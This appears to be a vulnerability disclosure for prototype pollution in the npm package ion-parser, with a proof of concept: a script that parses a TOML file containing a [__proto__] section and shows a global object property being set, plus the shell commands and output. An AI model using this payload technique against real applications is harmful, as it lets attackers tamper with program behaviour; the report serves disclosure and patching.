# Description

Prototype Pollution in ion-parser

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var fs = require('fs')
var ion = require('ion-parser')
console.log("Before : " + {}.polluted);
var parsed = ion.parse(fs.readFileSync('./payload.toml', 'utf-8'))
console.log("After : " + {}.polluted);
//payload.toml
[__proto__]
polluted = "Yes! Its Polluted"
```

2. Execute the following commands in terminal:

```
npm i ion-parser # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
